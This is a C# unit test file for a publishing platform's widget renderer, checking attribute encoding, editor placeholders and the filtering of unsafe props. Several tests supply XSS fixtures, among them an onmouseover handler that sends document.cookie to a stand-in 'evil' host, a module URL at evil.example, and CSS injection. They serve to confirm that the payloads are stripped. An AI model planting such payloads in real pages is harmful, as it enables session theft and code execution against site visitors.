using Imprint.Rendering;

namespace Imprint.Publishing.Tests.Rendering;

public sealed class WidgetViewTests
{
    private static RenderContext WithWidget(
        RenderMode mode, WidgetDescriptor? descriptor = null, bool withBundle = true)
    {
        descriptor ??= SampleNodes.CountdownDescriptor();
        return RenderHarness.Context(mode) with
        {
            ResolveWidget = tag => tag == descriptor.Tag ? descriptor : null,
            ResolveWidgetBundle = withBundle ? tag => $"/widgets/{tag}.abc123.js" : null,
        };
    }

    [Fact]
    public async Task Static_widget_renders_custom_element_with_island_and_placeholder_content()
    {
        var widget = SampleNodes.Widget(new KeyValuePair<string, string>("until", "2027-01-01"));

        var html = await RenderHarness.RenderNode(WithWidget(RenderMode.Static), widget);

        Assert.Contains("<x-countdown", html);
        Assert.Contains("until=\"2027-01-01\"", html);
        Assert.Contains("data-island=\"/widgets/x-countdown.abc123.js\"", html);
        Assert.Contains("Counting down", html);
        Assert.Contains("</x-countdown>", html);
    }

    [Fact]
    public async Task Props_not_declared_in_the_manifest_never_become_attributes()
    {
        var widget = SampleNodes.Widget(
            new KeyValuePair<string, string>("until", "2027-01-01"),
            new KeyValuePair<string, string>("onclick", "alert(1)"));

        var html = await RenderHarness.RenderNode(WithWidget(RenderMode.Static), widget);

        Assert.Contains("until=\"2027-01-01\"", html);
        Assert.DoesNotContain("onclick", html);
        Assert.DoesNotContain("alert(1)", html);
    }

    [Fact]
    public async Task A_declared_event_handler_or_style_prop_is_refused_at_the_emit_site()
    {
        // Defense in depth beyond submission validation: even a descriptor that DECLARES an
        // on*/style prop (a hand-edited manifest, or an upstream bug) must never emit it as
        // an author-controlled attribute — that is stored XSS / CSS injection on the page.
        var descriptor = new WidgetDescriptor
        {
            Tag = "x-countdown",
            Name = "Countdown",
            Bundle = "x-countdown.js",
            Placeholder = "Counting down…",
            Props =
            [
                new WidgetProp { Name = "onmouseover", Label = "Hover" },
                new WidgetProp { Name = "style", Label = "Style" },
                new WidgetProp { Name = "until", Label = "Until" },
            ],
        };
        var widget = SampleNodes.Widget(
            new KeyValuePair<string, string>("onmouseover", "fetch('//evil?c='+document.cookie)"),
            new KeyValuePair<string, string>("style", "position:fixed;inset:0"),
            new KeyValuePair<string, string>("until", "2027-01-01"));

        var html = await RenderHarness.RenderNode(WithWidget(RenderMode.Static, descriptor), widget);

        Assert.Contains("until=\"2027-01-01\"", html);  // the plain data prop still emits
        Assert.DoesNotContain("onmouseover", html);     // the event-handler name is refused
        Assert.DoesNotContain("document.cookie", html); // and its value never reaches markup
        Assert.DoesNotContain("position:fixed", html);  // the style prop is refused too
    }

    [Fact]
    public async Task A_data_island_prop_cannot_hijack_the_island_loader_module_url()
    {
        // The island loader imports the data-island value as a module URL. A prop named
        // data-island must never be emitted, or (as a duplicate attribute the browser
        // resolves to the author's value) it would run attacker-chosen JS on every visitor,
        // bypassing admin bundle review. The only data-island emitted is the real bundle.
        var descriptor = new WidgetDescriptor
        {
            Tag = "x-countdown",
            Name = "Countdown",
            Bundle = "x-countdown.js",
            Placeholder = "Counting down…",
            Props =
            [
                new WidgetProp { Name = "data-island", Label = "Island" },
                new WidgetProp { Name = "data-island-eager", Label = "Eager" },
            ],
        };
        var widget = SampleNodes.Widget(
            new KeyValuePair<string, string>("data-island", "https://evil.example/x.js"),
            new KeyValuePair<string, string>("data-island-eager", "true"));

        var html = await RenderHarness.RenderNode(WithWidget(RenderMode.Static, descriptor), widget);

        Assert.DoesNotContain("evil.example", html);
        // Exactly the system-emitted bundle URL survives, and only once.
        Assert.Contains("data-island=\"/widgets/x-countdown.abc123.js\"", html);
        Assert.Equal(1, Occurrences(html, "data-island="));
    }

    private static int Occurrences(string haystack, string needle)
    {
        var count = 0;
        for (var i = haystack.IndexOf(needle, StringComparison.Ordinal); i >= 0;
             i = haystack.IndexOf(needle, i + needle.Length, StringComparison.Ordinal))
        {
            count++;
        }

        return count;
    }

    [Fact]
    public async Task Prop_values_are_attribute_encoded()
    {
        var widget = SampleNodes.Widget(new KeyValuePair<string, string>("title", "Sale \"now\" & <soon>"));

        var html = await RenderHarness.RenderNode(WithWidget(RenderMode.Static), widget);

        Assert.Contains("&quot;now&quot;", html);
        Assert.Contains("&amp;", html);
        Assert.DoesNotContain("<soon>", html);
    }

    [Fact]
    public async Task Unknown_widget_renders_nothing_in_static_mode()
    {
        var widget = SampleNodes.Widget() with { Tag = "x-unknown" };

        var html = await RenderHarness.RenderNode(WithWidget(RenderMode.Static), widget);

        Assert.DoesNotContain("x-unknown", html);
        Assert.Equal(string.Empty, html.Trim());
    }

    [Fact]
    public async Task Eager_descriptor_marks_the_island_eager()
    {
        var descriptor = SampleNodes.CountdownDescriptor(eager: true);

        var html = await RenderHarness.RenderNode(WithWidget(RenderMode.Static, descriptor), SampleNodes.Widget());

        Assert.Contains("data-island-eager", html);
    }

    [Fact]
    public async Task Non_eager_descriptor_has_no_eager_marker()
    {
        var html = await RenderHarness.RenderNode(WithWidget(RenderMode.Static), SampleNodes.Widget());

        Assert.DoesNotContain("data-island-eager", html);
    }

    [Fact]
    public async Task Valid_aspect_ratio_becomes_an_inline_style()
    {
        var descriptor = SampleNodes.CountdownDescriptor(aspectRatio: "16 / 9");

        var html = await RenderHarness.RenderNode(WithWidget(RenderMode.Static, descriptor), SampleNodes.Widget());

        Assert.Contains("style=\"aspect-ratio: 16 / 9\"", html);
    }

    [Fact]
    public async Task Aspect_ratio_outside_the_character_allowlist_is_dropped()
    {
        var descriptor = SampleNodes.CountdownDescriptor(aspectRatio: "16/9; position:fixed");

        var html = await RenderHarness.RenderNode(WithWidget(RenderMode.Static, descriptor), SampleNodes.Widget());

        Assert.DoesNotContain("style=", html);
        Assert.DoesNotContain("position:fixed", html);
    }

    [Fact]
    public async Task Missing_bundle_resolver_omits_the_island_attribute()
    {
        var html = await RenderHarness.RenderNode(WithWidget(RenderMode.Static, withBundle: false), SampleNodes.Widget());

        Assert.Contains("<x-countdown", html);
        Assert.DoesNotContain("data-island", html);
    }

    [Fact]
    public async Task Editor_mode_renders_named_placeholder_instead_of_the_element()
    {
        var widget = SampleNodes.Widget();

        var html = await RenderHarness.RenderNode(WithWidget(RenderMode.Editor), widget);

        Assert.Contains("ip-widget-placeholder", html);
        Assert.Contains("Countdown", html);
        Assert.DoesNotContain("<x-countdown", html);
    }

    [Fact]
    public async Task Editor_mode_unknown_widget_warns_with_the_tag()
    {
        var widget = SampleNodes.Widget() with { Tag = "x-nope" };

        var html = await RenderHarness.RenderNode(WithWidget(RenderMode.Editor), widget);

        Assert.Contains("Unknown widget x-nope", html);
        Assert.Contains("ip-placeholder-warn", html);
    }
}
